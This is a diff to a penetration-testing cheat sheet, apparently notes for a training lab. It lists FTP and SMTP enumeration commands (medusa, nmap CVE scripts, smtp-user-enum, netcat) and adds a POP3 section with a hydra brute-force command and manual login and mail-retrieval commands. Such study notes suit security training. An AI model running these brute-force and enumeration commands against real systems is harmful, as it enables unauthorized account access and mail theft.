@@ -46,7 +46,6 @@ medusa -h 192.168.88.152 -u user -P /root/SecLists/Passwords/bt4-password.txt -M
 ./root/PWK-Lab/FTP/ftp-user-enum-1.0/ftp-user-enum.pl -U /root/PWK-Lab/fuzzdb/bruteforce/names/simple-users.txt -t 10.11.1.116"<br />
 
 
-
 - SMTP(25)<br />
 nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.227<br />
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1<br />
@@ -57,3 +56,11 @@ smtp-user-enum -M VRFY -U  /usr/share/seclists/Usernames/Names/names.txt -t 10.1
 telnet INSERTIPADDRESS 25<br />
 nc -nvv INSERTIPADDRESS 25<br />
 msf module : auxiliary/scanner/smtp/smtp_enum<br />
+
+- POP3(110)<br />
+Bruteforce : hydra -L usr.txt -P /usr/share/wordlists/fasttrack.txt -t20 192.168.88.183 -s55007 -I pop3<br />
+POP3 command<br />
+USER boris<br />
+PASS *****<br />
+LIST <br />
+RETR 1 <br />
